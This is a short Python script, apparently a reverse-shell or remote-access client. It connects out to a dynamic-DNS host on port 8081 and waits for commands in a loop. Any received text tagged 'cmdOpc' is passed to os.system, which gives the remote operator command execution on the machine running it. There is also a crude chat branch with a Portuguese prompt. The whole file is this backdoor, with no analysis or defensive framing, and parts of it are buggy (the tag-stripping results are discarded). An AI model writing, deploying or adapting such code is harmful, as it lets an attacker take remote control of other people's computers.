import socket
import subprocess
import os

REMOTE_HOST = socket.gethostbyname("spacetgt.ddns.net")
REMOTE_PORT = 8081

client = socket.socket()

client.connect((REMOTE_HOST, REMOTE_PORT))

while True:
    command = client.recv(1024)
    command = command.decode()
    if "cmdOpc" in command:
        command.replace("cmdOpc", "")
        os.system(command)
    elif "chatOpc" in command:
        command.replace("chatOpc", "")
        print(command)
        command = input('Mensagem: ')
        response = client.recv(1024)
        print(response)